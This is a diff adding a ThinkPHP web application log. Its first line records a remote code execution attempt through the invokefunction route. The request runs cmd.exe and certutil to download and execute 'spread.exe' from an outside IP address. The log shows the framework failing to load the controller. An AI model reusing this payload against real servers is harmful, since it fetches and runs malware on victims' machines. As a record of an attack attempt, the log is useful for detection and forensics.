@@ -1,0 +1,9 @@
+[ 2022-07-08T03:51:19+08:00 ] 185.231.222.37 /public/index.php?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe+%2Fc+certutil+-urlcache+-split+-f+http%3A%2F%2F185.231.222.37%3A19490%2Fspread.txt+C%3A%5CProgramData%5Cspread.exe+%26%26+C%3A%5CProgramData%5Cspread.exe
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000512s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000816s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000911s ]
+ERR: 无法加载控制器:\think\app
+
